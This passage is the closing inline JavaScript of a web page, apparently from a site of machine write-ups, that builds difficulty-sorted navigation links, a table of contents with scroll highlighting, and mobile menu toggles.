                "insane": document.getElementById("insane-machines")
            };

            // Clear existing links
            for (const category of Object.values(categories)) {
                category.innerHTML = '';
            }

            // Add machine links to appropriate categories
            for (const [machineName, data] of Object.entries(machineData)) {
                const difficulty = data.difficulty.toLowerCase();
                if (categories[difficulty]) {
                    const link = document.createElement('a');
                    link.href = `../machines/${machineName}.html`;
                    link.textContent = data.title;
                    
                    // Highlight current machine
                    if (data.title === "Cypher") {
                        link.classList.add('active');
                    }
                    
                    categories[difficulty].appendChild(link);
                }
            }
        }

        // Generate table of contents from headings
        function generateTableOfContents() {
            const writeupBody = document.querySelector('.writeup-body');
            const tocList = document.getElementById('toc-list');
            const headings = writeupBody.querySelectorAll('h1, h2, h3');
            
            // Clear existing TOC
            tocList.innerHTML = '';
            
            headings.forEach((heading, index) => {
                // Create an ID for the heading if it doesn't have one
                if (!heading.id) {
                    // Convert heading text to kebab-case for ID
                    const headingText = heading.textContent.trim();
                    const headingId = headingText
                        .toLowerCase()
                        .replace(/[^\w\s-]/g, '')
                        .replace(/\s+/g, '-');
                    
                    heading.id = headingId || `section-${index}`;
                }
                
                // Create a list item for the TOC
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.href = `#${heading.id}`;
                link.textContent = heading.textContent;
                
                // Add a class for h2 elements to create indentation
                if (heading.tagName === 'H2') {
                    listItem.classList.add('sub-heading');
                    listItem.style.paddingLeft = '15px';
                } else if (heading.tagName === 'H3') {
                    listItem.classList.add('sub-sub-heading');
                    listItem.style.paddingLeft = '30px';
                }
                
                listItem.appendChild(link);
                tocList.appendChild(listItem);
            });
            
            // Set up scroll highlighting
            setupScrollHighlighting();
        }

        // Highlight active TOC section on scroll
        function setupScrollHighlighting() {
            const tocLinks = document.querySelectorAll('.toc-sidebar a');
            
            function highlightActiveSection() {
                // Find which section is currently in view
                const fromTop = window.scrollY + 120;
                
                tocLinks.forEach(link => {
                    const section = document.querySelector(link.hash);
                    
                    if (section && 
                        section.offsetTop <= fromTop &&
                        section.offsetTop + section.offsetHeight > fromTop) {
                        link.classList.add('active');
                    } else {
                        link.classList.remove('active');
                    }
                });
            }
            
            // Call initially and on scroll
            window.addEventListener('scroll', highlightActiveSection);
            highlightActiveSection();
        }

        // Show error message
        function showError(message) {
            const contentArea = document.querySelector('.writeup-body');
            contentArea.innerHTML = `
                <div class="error-message">
                    <h2>Error</h2>
                    <p>${message}</p>
                </div>
            `;
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Hamburger menu functionality
            const hamburgerMenu = document.querySelector('.hamburger-menu');
            const sidebar = document.querySelector('.sidebar');
            const backdrop = document.querySelector('.backdrop');
            
            hamburgerMenu.addEventListener('click', () => {
                hamburgerMenu.classList.toggle('active');
                sidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            backdrop.addEventListener('click', () => {
                hamburgerMenu.classList.remove('active');
                sidebar.classList.remove('active');
                backdrop.classList.remove('active');
                tocSidebar.classList.remove('active');
            });
            
            // Difficulty buttons functionality
            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
            
            difficultyButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const difficulty = button.getAttribute('data-difficulty');
                    const machineList = document.querySelector(`#${difficulty}-machines`);
                    
                    machineList.classList.toggle('active');
                });
            });
            
            // Mobile TOC toggle
            const tocToggle = document.querySelector('.toc-toggle');
            const tocSidebar = document.querySelector('.toc-sidebar');
            
            tocToggle.addEventListener('click', () => {
                tocSidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            // Close TOC sidebar when clicking on a link (mobile)
            document.querySelectorAll('.toc-sidebar a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 1024) {
                        tocSidebar.classList.remove('active');
                        backdrop.classList.remove('active');
                    }
                });
            });
        });

        // Add smooth scrolling for TOC links
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.hash) {
                const element = document.querySelector(e.target.hash);
                if (element) {
                    e.preventDefault();
                    window.scrollTo({
                        top: element.offsetTop - 90,
                        behavior: 'smooth'
                    });
                }
            }
        });
    </script>
</body>
</html>